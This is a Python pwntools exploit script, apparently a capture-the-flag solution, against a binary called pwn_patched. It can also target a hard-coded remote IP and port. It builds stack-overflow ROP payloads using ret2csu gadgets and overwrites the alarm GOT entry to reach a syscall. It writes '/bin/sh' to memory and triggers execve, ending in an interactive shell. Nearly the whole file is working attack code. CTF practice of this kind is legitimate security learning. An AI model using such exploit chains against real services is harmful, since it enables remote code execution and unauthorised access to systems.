from pwn import *
from LibcSearcher import*
import sys
reomote_addr=["101.34.15.112",8001]
#libc=ELF('.bc-2.27.so')
if len(sys.argv)==1:
    context.log_level="debug" 
    # p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234",".ack"]) 
   # p = process(["qemu-aarch64", "-L", ".", ".ack"]) 
    p=process("./pwn_patched")
    context(arch = 'amd64', os = 'linux')
if len(sys.argv)==2 :
    if 'r' in sys.argv[1]:
        p = remote(reomote_addr[0],reomote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def debug():
    if len(sys.argv)==1:
        gdb.attach(p)
        pause()
def csu(csu1,rip,rdi,rsi,rdx,rbp,rbx):
    s=p64(rbx)+p64(rbp)+p64(rip)+p64(rdx)+p64(rsi)+p64(rdi)+p64(csu1)
    return s
pop_rdi=0x4007c3
pop_rsi_r15=0x4007c1
alarm_got=0x601018
alarm_plt=0x400530
read_plt=0x400540
leave_ret=0x400755
debug()
payload1=b''.join([
    b'a'*0x40,
    p64(0x601070),
    p64(0x4007BA),
    csu(0x4007A0,0x601020,0,0x601018,1,1,0),#造syscall
    p64(0)*2,
    p64(0x6011a0),
    p64(0)*4,
    p64(0x4006E7),
])
payload3=b''.join([
    b'a'*0x40,
    p64(0x601070),
    p64(0x4007BA),
    csu(0x4007A0,0x601020,0,0x601048,16,1,0),#修改地址，写flag
    p64(0)*2,
    p64(0x6010d0),
    p64(0)*4,
    p64(0x4006E7),
])
# payload4=b''.join([
#     b'a'*0x40,
#     p64(0x601070),
#     p64(0x4007BA),
#     csu(0x4007A0,0x601020,0,0x6010a0,59,1,0),
#     p64(0)*2,
#     p64(0x6010d0),
#     p64(0)*4,
#     p64(pop_rdi),
#     p64(0x601050),
#     p64(alarm_plt)
# #    csu(0x4007A0,alarm_got,0x601050,0x601048,16,1,0),
# ])
payload4=b''.join([
    b'a'*0x40,
    p64(0x601070),
    p64(0x4007BA),
    csu(0x4007A0,0x601020,0,0x6010a0,59,1,0),
    p64(0),
    p64(0),#rbx
    p64(0x4007a0),#rbp
    p64(alarm_got),#rip
    p64(0),#rdx
    p64(0),#rsi
    p64(0x601050),#rdi
    p64(0x4007a0),
])
payload5=b''.join([
    b'a'*0x40,
    p64(0x601070),
    p64(0x4007BA),
    csu(0x4007A0,0x601020,0,0x6010a0,0,1,0),
    # p64(pop_rdi),
    # p64(0x601050),
    # p64(alarm_plt)
#    csu(0x4007A0,alarm_got,0x601050,0x601048,16,1,0),
])
#debug()
sl(payload3)
s(p64(0x601ff8)+b'/bin/sh\x00')
sl(payload1)
pause()
s(p8(0x99))
pause()
sl(payload4)
#pause()
s('\x00'*59)
shell()
